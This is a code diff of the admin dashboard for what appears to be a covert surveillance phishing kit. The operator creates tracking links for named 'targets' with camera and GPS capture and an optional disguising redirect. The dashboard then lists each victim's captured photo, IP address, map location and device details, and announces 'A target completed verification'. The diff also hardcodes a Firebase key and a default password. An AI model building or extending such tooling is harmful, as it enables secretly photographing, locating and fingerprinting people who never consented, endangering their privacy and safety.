-        <input type="text" id="binSearch" placeholder="🔍 Search by name or IP..." style="width:220px;">
-        <button class="btn btn-red" id="emptyBinBtn" style="margin-left:auto;">🔥 Empty Bin</button>
-    </div>
-    <div id="binPhotoGrid" class="grid"></div>
-</div>
+        <div class="nav-section">
+            <div class="nav-label">Overview</div>
+            <button class="nav-item active" data-panel="dashboard">
+                <span class="nav-icon">📊</span> Dashboard
+            </button>
+        </div>
 
-<!-- ── LINK RECYCLE BIN ─────────────────────────────────────────────────── -->
-<div class="section" style="border-color:#1e3d1e;">
-    <div class="section-header">
-        <h3>♻️ Link Recycle Bin</h3>
-        <span class="badge badge-green" id="linkBinCount">0</span>
-    </div>
-    <p style="font-size:11px;color:#666;margin:0 0 10px;">
-        Deleted links. Restore to re-activate, or burn forever.
-    </p>
-    <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
-        <input type="text" id="linkBinSearch" placeholder="🔍 Search by name..." style="width:220px;">
-        <button class="btn btn-red" id="emptyLinkBinBtn" style="margin-left:auto;">🔥 Empty Bin</button>
-    </div>
-    <div id="linkBinGrid" class="grid"></div>
-</div>
+        <div class="nav-section">
+            <div class="nav-label">Management</div>
+            <button class="nav-item" data-panel="links">
+                <span class="nav-icon">🔗</span> Manage Links
+                <span class="nav-badge nav-badge-blue" id="navLinkCount">0</span>
+            </button>
+            <button class="nav-item" data-panel="captures">
+                <span class="nav-icon">📸</span> Live Captures
+                <span class="nav-badge" id="navCaptureCount">0</span>
+            </button>
+        </div>
 
-<!-- ── FIREBASE + IMPORTMAP ─────────────────────────────────────────────── -->
+        <div class="nav-section">
+            <div class="nav-label">Data</div>
+            <button class="nav-item" data-panel="bin">
+                <span class="nav-icon">🗑️</span> Recycle Bin
+                <span class="nav-badge" id="navBinCount" style="display:none">0</span>
+            </button>
+        </div>
+
+        <div class="sidebar-footer">
+            <button class="nav-item" id="changePwBtn">
+                <span class="nav-icon">🔐</span> Change Password
+            </button>
+            <button class="nav-item" id="refreshBtn">
+                <span class="nav-icon">🔄</span> Refresh
+            </button>
+        </div>
+    </nav>
+
+    <!-- MAIN -->
+    <div class="main">
+        <!-- TOP BAR -->
+        <div class="topbar">
+            <div class="topbar-left">
+                <div class="live-dot"></div>
+                <h2 id="panelTitle">Dashboard</h2>
+            </div>
+            <div class="topbar-right">
+                <button class="btn btn-teal"   id="exportBtn">📥 Export CSV</button>
+            </div>
+        </div>
+
+        <div class="content">
+
+            <!-- ══════════════ DASHBOARD PANEL ══════════════ -->
+            <div class="panel active" id="panel-dashboard">
+
+                <div class="stats-grid">
+                    <div class="stat-card stat-blue">
+                        <span class="stat-icon">📸</span>
+                        <div class="stat-num" id="statTotal">0</div>
+                        <div class="stat-lbl">Total Captures</div>
+                    </div>
+                    <div class="stat-card stat-green">
+                        <span class="stat-icon">📅</span>
+                        <div class="stat-num" id="statToday">0</div>
+                        <div class="stat-lbl">Captures Today</div>
+                    </div>
+                    <div class="stat-card stat-purple">
+                        <span class="stat-icon">🔗</span>
+                        <div class="stat-num" id="statLinks">0</div>
+                        <div class="stat-lbl">Active Links</div>
+                    </div>
+                    <div class="stat-card stat-yellow">
+                        <span class="stat-icon">👁</span>
+                        <div class="stat-num" id="statVisits">0</div>
+                        <div class="stat-lbl">Total Visits</div>
+                    </div>
+                    <div class="stat-card stat-teal">
+                        <span class="stat-icon">📷</span>
+                        <div class="stat-num" id="statWithPhoto">0</div>
+                        <div class="stat-lbl">With Photo</div>
+                    </div>
+                    <div class="stat-card stat-red">
+                        <span class="stat-icon">🗑️</span>
+                        <div class="stat-num" id="statBin">0</div>
+                        <div class="stat-lbl">In Recycle Bin</div>
+                    </div>
+                </div>
+
+                <!-- Recent captures preview -->
+                <div class="section">
+                    <div class="section-header">
+                        <h3>🕐 Recent Captures</h3>
+                        <button class="btn btn-gray btn-sm" style="margin-left:auto;" data-panel="captures">View All →</button>
+                    </div>
+                    <div class="cap-grid" id="recentGrid"></div>
+                </div>
+            </div>
+
+            <!-- ══════════════ LINKS PANEL ══════════════ -->
+            <div class="panel" id="panel-links">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>⚡ Generate New Link</h3>
+                    </div>
+                    <div class="form-row">
+                        <input type="text" id="linkName" placeholder="Target Name (e.g. Shahid)" style="width:200px;">
+                        <input type="url"  id="linkRedirect" placeholder="Redirect URL (optional)" style="flex:1;min-width:180px;">
+                    </div>
+                    <div class="form-row">
+                        <label class="check-label"><input type="checkbox" id="checkCam" checked> 📷 Camera</label>
+                        <label class="check-label"><input type="checkbox" id="checkGPS" checked> 📍 GPS</label>
+                        <button class="btn btn-primary" id="createBtn">⚡ Generate Link</button>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <div class="section-header">
+                        <h3>🔗 All Links</h3>
+                        <span class="badge badge-green" id="linkCount">0</span>
+                        <div class="section-header-right">
+                            <input type="text" id="searchLinks" placeholder="🔍 Search..." style="width:160px;">
+                        </div>
+                    </div>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Target Name</th>
+                                    <th>Permissions</th>
+                                    <th>Redirect</th>
+                                    <th>Status</th>
+                                    <th>👁 Visits</th>
+                                    <th>Created</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="linkTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ══════════════ CAPTURES PANEL ══════════════ -->
+            <div class="panel" id="panel-captures">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>📸 Live Captures</h3>
+                        <span class="badge" id="logCount">0</span>
+                        <div class="section-header-right">
+                            <button class="btn btn-red btn-sm" id="bulkDeleteBtn">🗑 Delete Selected</button>
+                        </div>
+                    </div>
+                    <div class="filter-bar">
+                        <input type="text" id="searchLogs" placeholder="🔍 Search name, IP, OS...">
+                        <select id="timeFilter">
+                            <option value="all">All Time</option>
+                            <option value="today">Today</option>
+                            <option value="week">This Week</option>
+                            <option value="month">This Month</option>
+                        </select>
+                        <select id="photoFilter">
+                            <option value="all">All</option>
+                            <option value="photo">With Photo</option>
+                            <option value="nophoto">No Photo</option>
+                        </select>
+                        <select id="gpsFilter">
+                            <option value="all">All GPS</option>
+                            <option value="gps">With GPS</option>
+                            <option value="nogps">No GPS</option>
+                        </select>
+                        <select id="sortFilter">
+                            <option value="newest">Newest First</option>
+                            <option value="oldest">Oldest First</option>
+                        </select>
+                        <label class="check-label" style="margin-left:auto;">
+                            <input type="checkbox" id="selectAllCaptures"> Select All
+                        </label>
+                    </div>
+                    <div id="photoGrid" class="cap-grid"></div>
+                </div>
+            </div>
+
+            <!-- ══════════════ RECYCLE BIN PANEL ══════════════ -->
+            <div class="panel" id="panel-bin">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>🗑️ Recycle Bin</h3>
+                        <span class="badge badge-red" id="binCount">0</span>
+                        <div class="section-header-right">
+                            <button class="btn btn-red btn-sm" id="emptyAllBinBtn">🔥 Empty All</button>
+                        </div>
+                    </div>
+                    <p style="font-size:11px;color:var(--muted);margin-bottom:14px;">
+                        All deleted items (captures + links) are stored here. Auto-removed after 30 days.
+                    </p>
+
+                    <div class="bin-filter-bar">
+                        <!-- Type tabs -->
+                        <div class="bin-type-tabs">
+                            <button class="bin-tab active" data-bin-type="all">All</button>
+                            <button class="bin-tab" data-bin-type="photos">📷 Photos</button>
+                            <button class="bin-tab" data-bin-type="links">🔗 Links</button>
+                        </div>
+                        <input type="text" id="binSearch" placeholder="🔍 Search..." style="width:190px;">
+                        <select id="binSortFilter">
+                            <option value="newest">Newest Deleted</option>
+                            <option value="oldest">Oldest Deleted</option>
+                        </select>
+                        <button class="btn btn-red btn-sm" id="emptyBinPhotoBtn" style="display:none;">🔥 Empty Photos</button>
+                        <button class="btn btn-red btn-sm" id="emptyBinLinkBtn"  style="display:none;">🔥 Empty Links</button>
+                    </div>
+
+                    <div id="binGrid" class="cap-grid"></div>
+                </div>
+            </div>
+
+        </div><!-- /content -->
+    </div><!-- /main -->
+</div><!-- /shell -->
+
+<!-- ══════════════════════════════════════════════════════════
+     FIREBASE + SCRIPT
+══════════════════════════════════════════════════════════ -->
 <script type="importmap">
 {
     "imports": {
@@ -473,11 +821,10 @@
 </script>
 
 <script type="module">
-// ── IMPORTS FIRST ─────────────────────────────────────────────────────────
 import { initializeApp } from "firebase-app";
 import { getDatabase, ref, onValue, remove, push, set, update } from "firebase-database";
 
-// ── FIREBASE INIT ─────────────────────────────────────────────────────────
+// ── FIREBASE ──────────────────────────────────────────────────────────────
 const firebaseConfig = {
     apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
     authDomain: "camera-c436d.firebaseapp.com",
@@ -490,587 +837,820 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db  = getDatabase(app);
 
-// ── RUNTIME STATE ──────────────────────────────────────────────────────────
-let allLogsData  = null;  // all photo_history from Firebase
-let allLinksData = null;  // all managed_links from Firebase
-let logsCache    = {};    // key → log object, for safe bin moves
-let adminPassword = localStorage.getItem('adminPassword') || 'admin123';
-let previousLogCount = null; // for new-capture notifications
+// ── STATE ─────────────────────────────────────────────────────────────────
+let allLogsData    = null;
+let allLinksData   = null;
+let logsCache      = {};
+let adminPassword  = localStorage.getItem('adminPassword') || 'admin123';
+let prevLogCount   = null;
+let selectedCaptures = new Set();   // keys of selected cards
+let activeBinType  = 'all';         // 'all' | 'photos' | 'links'
 
-// ── TOAST NOTIFICATION ─────────────────────────────────────────────────────
-function showToast(msg, color = '#007bff') {
-    const t = document.getElementById('toast');
-    t.style.borderLeftColor = color;
-    t.innerHTML = msg;
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(() => { t.style.display = 'none'; }, 4000);
-}
+// ── UNIFIED BIN HELPERS ───────────────────────────────────────────────────
+// All deleted items go to ONE key: 'unified_bin'
+// Each item has: _type ('photo'|'link'), deletedAt, ...original data
+function getBin()      { return JSON.parse(localStorage.getItem('unified_bin') || '[]'); }
+function saveBin(arr)  { localStorage.setItem('unified_bin', JSON.stringify(arr)); }
 
-// ── BROWSER NOTIFICATION ───────────────────────────────────────────────────
-function requestNotificationPermission() {
-    if ('Notification' in window && Notification.permission === 'default') {
-        Notification.requestPermission();
+// Migrate old split bins on load
+function migrateLegacyBins() {
+    const unified = getBin();
+    let changed = false;
+
+    const old1 = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+    old1.forEach(p => {
+        if (!unified.find(x => x._type === 'photo' && String(x.id) === String(p.id))) {
+            unified.unshift({ ...p, _type: 'photo' });
+            changed = true;
+        }
+    });
+
+    const old2 = JSON.parse(localStorage.getItem('link_bin') || '[]');
+    old2.forEach(l => {
+        if (!unified.find(x => x._type === 'link' && x.firebaseId === l.firebaseId)) {
+            unified.unshift({ ...l, _type: 'link' });
+            changed = true;
+        }
+    });
+
+    if (changed) {
+        saveBin(unified);
+        localStorage.removeItem('recycle_bin');
+        localStorage.removeItem('link_bin');
     }
 }
-function sendBrowserNotification(title, body) {
-    if ('Notification' in window && Notification.permission === 'granted') {
-        new Notification(title, { body, icon: '' });
-    }
+
+// ── HTML ESCAPE ───────────────────────────────────────────────────────────
+function esc(s) {
+    return String(s ?? '')
+        .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+        .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
-// ── NOTIFICATION SOUND (beep via Web Audio API) ────────────────────────────
+// ── TOAST ─────────────────────────────────────────────────────────────────
+function toast(msg, color = 'var(--primary)') {
+    const stack = document.getElementById('toastStack');
+    const el = document.createElement('div');
+    el.className = 'toast-item';
+    el.style.borderLeftColor = color;
+    el.innerHTML = msg;
+    stack.appendChild(el);
+    setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateY(6px)'; el.style.transition = 'all .3s'; setTimeout(() => el.remove(), 300); }, 3500);
+}
+
+// ── SOUND ─────────────────────────────────────────────────────────────────
 function playBeep() {
     try {
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(880, ctx.currentTime);
-        gain.gain.setValueAtTime(0.3, ctx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
-        osc.start(ctx.currentTime);
-        osc.stop(ctx.currentTime + 0.4);
-    } catch (e) { /* Audio context may be blocked before user interaction */ }
+        const osc = ctx.createOscillator(); const g = ctx.createGain();
+        osc.connect(g); g.connect(ctx.destination);
+        osc.type = 'sine'; osc.frequency.setValueAtTime(880, ctx.currentTime);
+        g.gain.setValueAtTime(0.3, ctx.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
+        osc.start(); osc.stop(ctx.currentTime + 0.5);
+    } catch(e){}
 }
 
-// ── LOGIN ──────────────────────────────────────────────────────────────────
-document.getElementById('loginBtn').onclick = doLogin;
-document.getElementById('adminPass').addEventListener('keydown', e => {
-    if (e.key === 'Enter') doLogin();
-});
+// ── BROWSER NOTIFICATIONS ─────────────────────────────────────────────────
+function askNotif() {
+    if ('Notification' in window && Notification.permission === 'default')
+        Notification.requestPermission();
+}
+function sendNotif(title, body) {
+    if ('Notification' in window && Notification.permission === 'granted')
+        new Notification(title, { body });
+}
+
+// ══════════════════════════════════════════════════════════
+// LOGIN
+// ══════════════════════════════════════════════════════════
 function doLogin() {
-    const val = document.getElementById('adminPass').value;
-    if (val === adminPassword) {
+    const v = document.getElementById('adminPass').value;
+    if (v === adminPassword) {
         document.getElementById('loginOverlay').style.display = 'none';
-        requestNotificationPermission();
+        askNotif();
     } else {
         document.getElementById('loginError').style.display = 'block';
         document.getElementById('adminPass').value = '';
     }
 }
+document.getElementById('loginBtn').onclick = doLogin;
+document.getElementById('adminPass').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
 
-document.getElementById('closeEditLink').onclick = () => {
-    document.getElementById('editLinkModal').style.display = 'none';
-};
+// ══════════════════════════════════════════════════════════
+// SIDEBAR NAVIGATION
+// ══════════════════════════════════════════════════════════
+const panelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin' };
 
-// ── CHANGE PASSWORD ────────────────────────────────────────────────────────
-document.getElementById('changePwBtn').onclick = () => {
-    document.getElementById('pwModal').style.display = 'flex';
-    document.getElementById('pwMsg').innerText = '';
-};
-document.getElementById('closePwModal').onclick = () => {
-    document.getElementById('pwModal').style.display = 'none';
-};
-document.getElementById('savePwBtn').onclick = () => {
-    const old  = document.getElementById('oldPw').value;
-    const nw   = document.getElementById('newPw').value;
-    const nw2  = document.getElementById('newPw2').value;
-    const msg  = document.getElementById('pwMsg');
+function switchPanel(name) {
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.nav-item[data-panel]').forEach(n => n.classList.remove('active'));
+    const panel = document.getElementById('panel-' + name);
+    if (panel) panel.classList.add('active');
+    const nav = document.querySelector(`.nav-item[data-panel="${name}"]`);
+    if (nav) nav.classList.add('active');
+    document.getElementById('panelTitle').innerText = panelTitles[name] || name;
+}
 
-    if (old !== adminPassword) {
-        msg.style.color = 'var(--red)'; msg.innerText = '❌ Current password is wrong.'; return;
-    }
-    if (nw.length < 4) {
-        msg.style.color = 'var(--red)'; msg.innerText = '❌ New password too short (min 4 chars).'; return;
-    }
-    if (nw !== nw2) {
-        msg.style.color = 'var(--red)'; msg.innerText = '❌ Passwords do not match.'; return;
-    }
-    adminPassword = nw;
-    localStorage.setItem('adminPassword', nw);
-    msg.style.color = 'var(--green)'; msg.innerText = '✅ Password changed!';
-    document.getElementById('oldPw').value = '';
-    document.getElementById('newPw').value = '';
-    document.getElementById('newPw2').value = '';
-    setTimeout(() => { document.getElementById('pwModal').style.display = 'none'; }, 1200);
-};
+document.querySelectorAll('[data-panel]').forEach(el => {
+    el.addEventListener('click', () => switchPanel(el.dataset.panel));
+});
 
-// ── LINKS TABLE ────────────────────────────────────────────────────────────
-onValue(ref(db, 'managed_links'), snapshot => {
-    allLinksData = snapshot.val();
+// ══════════════════════════════════════════════════════════
+// STATS
+// ══════════════════════════════════════════════════════════
+function updateStats() {
+    const total = allLogsData ? Object.keys(allLogsData).length : 0;
+    document.getElementById('statTotal').innerText = total;
+
+    const todayStart = new Date(); todayStart.setHours(0,0,0,0);
+    let todayCount = 0, withPhoto = 0;
+    if (allLogsData) Object.values(allLogsData).forEach(p => {
+        if (p.timestamp >= todayStart.getTime()) todayCount++;
+        if (p.image) withPhoto++;
+    });
+    document.getElementById('statToday').innerText    = todayCount;
+    document.getElementById('statWithPhoto').innerText = withPhoto;
+
+    let activeLinks = 0, totalVisits = 0;
+    if (allLinksData) Object.values(allLinksData).forEach(l => {
+        if (l.active) activeLinks++;
+        totalVisits += (l.visits || 0);
+    });
+    document.getElementById('statLinks').innerText  = activeLinks;
+    document.getElementById('statVisits').innerText = totalVisits;
+
+    const binCount = getBin().length;
+    document.getElementById('statBin').innerText = binCount;
+    document.getElementById('binCount').innerText = binCount;
+    const navBin = document.getElementById('navBinCount');
+    navBin.innerText = binCount;
+    navBin.style.display = binCount > 0 ? '' : 'none';
+
+    document.getElementById('navCaptureCount').innerText = total;
+    document.getElementById('navLinkCount').innerText    = allLinksData ? Object.keys(allLinksData).length : 0;
+}
+
+// ══════════════════════════════════════════════════════════
+// LINKS TABLE
+// ══════════════════════════════════════════════════════════
+onValue(ref(db, 'managed_links'), snap => {
+    allLinksData = snap.val();
     renderLinksTable();
     updateStats();
 });
 
 function renderLinksTable() {
-    const links  = allLinksData;
     const tbody  = document.getElementById('linkTableBody');
+    const search = (document.getElementById('searchLinks')?.value || '').toLowerCase();
     tbody.innerHTML = '';
     let count = 0;
 
-    if (!links) {
-        tbody.innerHTML = '<tr><td colspan="6" class="empty">No links yet. Create one above.</td></tr>';
+    if (!allLinksData) {
+        tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">🔗</span>No links yet. Create one above.</div></td></tr>';
         document.getElementById('linkCount').innerText = '0';
         return;
     }
 
-    Object.keys(links).forEach(id => {
-        const l = links[id];
+    Object.keys(allLinksData).forEach(id => {
+        const l = allLinksData[id];
+        if (search && !(l.name || '').toLowerCase().includes(search)) return;
         count++;
         const row = document.createElement('tr');
+        const redir = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
         row.innerHTML = `
-            <td><b>${escHtml(l.name)}</b></td>
-            <td>${l.cam ? '📷' : ''} ${l.gps ? '📍' : ''}</td>
-            <td class="${l.active ? 'status-active' : 'status-inactive'}">
-                ${l.active ? '● ACTIVE' : '● DISABLED'}
+            <td><b>${esc(l.name)}</b></td>
+            <td style="white-space:nowrap;">
+                ${l.cam ? '<span class="tag">📷 CAM</span>' : '<span style="color:#475569;font-size:11px;">No cam</span>'}
+                ${l.gps ? '<span class="tag">📍 GPS</span>' : '<span style="color:#475569;font-size:11px;">No GPS</span>'}
             </td>
-            <td><b style="color:#f0c040;">${l.visits || 0}</b></td>
-            <td style="font-size:11px;color:#888;">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
-            <td>
-                <button class="btn btn-gray"  data-action="copy"   data-id="${id}">Copy URL</button>
-                <button class="btn btn-yellow" data-action="rename"  data-id="${id}">✏️ Rename</button>
-                <button class="btn ${l.active ? 'btn-red' : 'btn-green'}"
+            <td>${redir}</td>
+            <td class="${l.active ? 'status-active' : 'status-inactive'}">
+                ${l.active ? '● ACTIVE' : '● OFF'}
+            </td>
+            <td><b style="color:var(--yellow);">${l.visits || 0}</b></td>
+            <td style="font-size:11px;color:var(--muted);">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
+            <td style="white-space:nowrap;">
+                <button class="btn btn-gray btn-sm"    data-action="copy"   data-id="${id}">📋 Copy</button>
+                <button class="btn btn-teal btn-sm"    data-action="qr"     data-id="${id}">📱 QR</button>
+                <button class="btn btn-yellow btn-sm"  data-action="rename" data-id="${id}">✏️</button>
+                <button class="btn ${l.active ? 'btn-orange' : 'btn-green'} btn-sm"
                         data-action="toggle" data-id="${id}" data-active="${l.active}">
-                    ${l.active ? 'Disable' : 'Enable'}
+                    ${l.active ? '⏸' : '▶'}
                 </button>
-                <button class="btn btn-red"   data-action="delete" data-id="${id}">Delete</button>
+                <button class="btn btn-red btn-sm"     data-action="delete" data-id="${id}">🗑</button>
             </td>
         `;
         tbody.appendChild(row);
     });
 
     document.getElementById('linkCount').innerText = count;
+    if (count === 0 && search) tbody.innerHTML = '<tr><td colspan="7"><div class="empty">No links match your search.</div></td></tr>';
 }
 
-// Link table event delegation
+document.getElementById('searchLinks')?.addEventListener('input', renderLinksTable);
+
+// Link table click delegation
 document.getElementById('linkTableBody').addEventListener('click', e => {
     const btn = e.target.closest('button[data-action]');
     if (!btn) return;
     const { action, id } = btn.dataset;
 
     if (action === 'copy') {
-        const base = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
+        const base = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const url  = base + '?linkId=' + id;
         navigator.clipboard.writeText(url)
-            .then(() => showToast('✅ Link copied to clipboard!'))
+            .then(() => toast('✅ Link copied!'))
             .catch(() => prompt('Copy this URL:', url));
+
+    } else if (action === 'qr') {
+        const base = window.location.origin + window.location.pathname.replace('admin.html','index.html');
+        showQR(base + '?linkId=' + id);
 
     } else if (action === 'toggle') {
         const isActive = btn.dataset.active === 'true';
         update(ref(db, 'managed_links/' + id), { active: !isActive });
 
     } else if (action === 'rename') {
-        const l = allLinksData && allLinksData[id];
+        const l = allLinksData?.[id];
         if (!l) return;
-        document.getElementById('editLinkName').value = l.name || '';
-        document.getElementById('editCam').checked    = !!l.cam;
-        document.getElementById('editGPS').checked    = !!l.gps;
-        document.getElementById('editLinkModal').style.display = 'flex';
+        document.getElementById('editLinkName').value  = l.name || '';
+        document.getElementById('editRedirect').value  = l.redirectUrl || '';
+        document.getElementById('editCam').checked     = !!l.cam;
+        document.getElementById('editGPS').checked     = !!l.gps;
+        document.getElementById('editLinkModal').classList.add('open');
         document.getElementById('saveEditLink').onclick = () => {
-            const newName = document.getElementById('editLinkName').value.trim() || l.name;
-            const newCam  = document.getElementById('editCam').checked;
-            const newGPS  = document.getElementById('editGPS').checked;
-            update(ref(db, 'managed_links/' + id), { name: newName, cam: newCam, gps: newGPS })
-                .then(() => {
-                    document.getElementById('editLinkModal').style.display = 'none';
-                    showToast('✅ Link updated: ' + newName, '#28a745');
-                });
+            const nm  = document.getElementById('editLinkName').value.trim() || l.name;
+            const ru  = document.getElementById('editRedirect').value.trim();
+            update(ref(db, 'managed_links/' + id), {
+                name: nm,
+                redirectUrl: ru,
+                cam: document.getElementById('editCam').checked,
+                gps: document.getElementById('editGPS').checked
+            }).then(() => {
+                document.getElementById('editLinkModal').classList.remove('open');
+                toast('✅ Link updated: ' + nm, 'var(--green)');
+            });
         };
 
     } else if (action === 'delete') {
-        if (!confirm('Move this link to the Link Recycle Bin?')) return;
-        // Get link data before deleting — to store in link bin
-        const l = allLinksData && allLinksData[id];
+        if (!confirm('Move this link to Recycle Bin?')) return;
+        const l = allLinksData?.[id];
         if (l) {
-            let linkBin = JSON.parse(localStorage.getItem('link_bin') || '[]');
-            linkBin.unshift({ ...l, firebaseId: id, deletedAt: Date.now() });
-            localStorage.setItem('link_bin', JSON.stringify(linkBin));
+            const bin = getBin();
+            bin.unshift({ ...l, _type: 'link', firebaseId: id, deletedAt: Date.now() });
+            saveBin(bin);
         }
         remove(ref(db, 'managed_links/' + id));
-        renderLinkBin();
-        showToast('🗑️ Link moved to Link Recycle Bin', '#e0a800');
+        updateStats();
+        renderBin();
+        toast('🗑️ Link moved to Recycle Bin', 'var(--yellow)');
     }
 });
 
-// ── CREATE LINK ────────────────────────────────────────────────────────────
+// Create link
 document.getElementById('createBtn').onclick = () => {
     const name = document.getElementById('linkName').value.trim() || 'Unnamed';
     const id   = 'LNK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    const ru   = document.getElementById('linkRedirect').value.trim();
     set(ref(db, 'managed_links/' + id), {
-        id,
-        name,
-        active:    true,
-        visits:    0,
-        cam:       document.getElementById('checkCam').checked,
-        gps:       document.getElementById('checkGPS').checked,
-        createdAt: Date.now()
+        id, name,
+        active:      true,
+        visits:      0,
+        cam:         document.getElementById('checkCam').checked,
+        gps:         document.getElementById('checkGPS').checked,
+        redirectUrl: ru || '',
+        createdAt:   Date.now()
     });
     document.getElementById('linkName').value = '';
-    showToast('✅ Link created: ' + name);
+    document.getElementById('linkRedirect').value = '';
+    toast('✅ Link created: ' + name, 'var(--green)');
 };
 
-// ── STATS ──────────────────────────────────────────────────────────────────
-function updateStats() {
-    // Total captures
-    const total = allLogsData ? Object.keys(allLogsData).length : 0;
-    document.getElementById('statTotal').innerText = total;
+// ══════════════════════════════════════════════════════════
+// CAPTURES / LOGS
+// ══════════════════════════════════════════════════════════
+onValue(ref(db, 'photo_history'), snap => {
+    const newData  = snap.val();
+    const newCount = newData ? Object.keys(newData).length : 0;
 
-    // Captures today
-    const todayStart = new Date(); todayStart.setHours(0,0,0,0);
-    let today = 0;
-    if (allLogsData) {
-        Object.values(allLogsData).forEach(p => {
-            if (p.timestamp && p.timestamp >= todayStart.getTime()) today++;
-        });
+    if (prevLogCount !== null && newCount > prevLogCount) {
+        playBeep();
+        toast('🔔 New capture received!', 'var(--green)');
+        sendNotif('New Capture!', 'A target completed verification.');
     }
-    document.getElementById('statToday').innerText = today;
+    prevLogCount = newCount;
+    allLogsData = newData;
+    renderLogs();
+    renderRecent();
+    updateStats();
+});
 
-    // Active links
-    let activeLinks = 0, totalVisits = 0;
-    if (allLinksData) {
-        Object.values(allLinksData).forEach(l => {
-            if (l.active) activeLinks++;
-            totalVisits += (l.visits || 0);
-        });
+['searchLogs','timeFilter','photoFilter','gpsFilter','sortFilter'].forEach(id => {
+    document.getElementById(id)?.addEventListener('change', renderLogs);
+    document.getElementById(id)?.addEventListener('input',  renderLogs);
+});
+
+function passFilter(p) {
+    const search = document.getElementById('searchLogs').value.toLowerCase();
+    const time   = document.getElementById('timeFilter').value;
+    const photo  = document.getElementById('photoFilter').value;
+    const gps    = document.getElementById('gpsFilter').value;
+    const d      = p.device || {};
+    const now    = Date.now();
+
+    if (search) {
+        const hay = [p.linkName, p.ipAddress, d.os, d.browser, d.timezone, p.date].join(' ').toLowerCase();
+        if (!hay.includes(search)) return false;
     }
-    document.getElementById('statLinks').innerText  = activeLinks;
-    document.getElementById('statVisits').innerText = totalVisits;
-}
-
-// ── TIME FILTER HELPER ──────────────────────────────────────────────────────
-function passesTimeFilter(log) {
-    const f   = document.getElementById('timeFilter').value;
-    const now = Date.now();
-    if (f === 'all')   return true;
-    if (!log.timestamp) return true;
-    if (f === 'today') return (now - log.timestamp) < 86400000;
-    if (f === 'week')  return (now - log.timestamp) < 604800000;
+    if (time === 'today' && (now - (p.timestamp||0)) > 86400000)   return false;
+    if (time === 'week'  && (now - (p.timestamp||0)) > 604800000)  return false;
+    if (time === 'month' && (now - (p.timestamp||0)) > 2592000000) return false;
+    if (photo === 'photo'   && !p.image)   return false;
+    if (photo === 'nophoto' &&  p.image)   return false;
+    const hasGPS = p.latitude && p.latitude !== 'Denied';
+    if (gps === 'gps'   && !hasGPS)  return false;
+    if (gps === 'nogps' &&  hasGPS)  return false;
     return true;
 }
 
-// ── RENDER LOG CARDS ────────────────────────────────────────────────────────
+function buildCapCard(key, p, inBin = false) {
+    const d      = p.device || {};
+    const hasGPS = p.latitude && p.latitude !== 'Denied' && p.longitude && p.longitude !== 'Denied';
+
+    const card = document.createElement('div');
+    card.className = inBin ? 'bin-card' : 'log-card';
+    card.dataset.key = key;
+
+    card.innerHTML = `
+        <div class="card-img" ${p.image ? `data-lb-img="${esc(p.image)}" data-lb-info="${esc(p.linkName)} — ${esc(p.date||'')} ${esc(p.time||'')}"` : ''}>
+            ${p.image
+                ? `<img src="${p.image}" alt="Capture">
+                   <div class="img-overlay">🔍</div>
+                   <span class="img-badge">📷</span>`
+                : `<div class="no-img"><span>📷</span><span style="font-size:11px;">No Image</span></div>`
+            }
+        </div>
+        <div class="card-body">
+            ${!inBin ? `<label class="check-label" style="margin-bottom:6px;">
+                <input type="checkbox" class="cap-select" data-key="${key}"> <b>${esc(p.linkName)}</b>
+            </label>` : `<p><b>${esc(p.linkName)}</b></p>`}
+            <p class="meta"><span class="tag">${esc(d.os||'?')}</span><span class="tag">${esc(d.browser||'?')}</span></p>
+            <p class="meta">🌐 ${esc(p.ipAddress||'N/A')}</p>
+            <p class="meta">📍 ${hasGPS
+                ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:var(--teal);">View Map</a>`
+                : 'GPS Denied'}</p>
+            <p class="meta">🕐 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
+            ${inBin ? `<p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
+
+            <div class="device-panel" id="dp_${key}">
+                <div class="dp-row"><span class="dp-key">OS</span><span class="dp-val">${esc(d.os||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Browser</span><span class="dp-val">${esc(d.browser||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Screen</span><span class="dp-val">${d.screenWidth||'?'}×${d.screenHeight||'?'}</span></div>
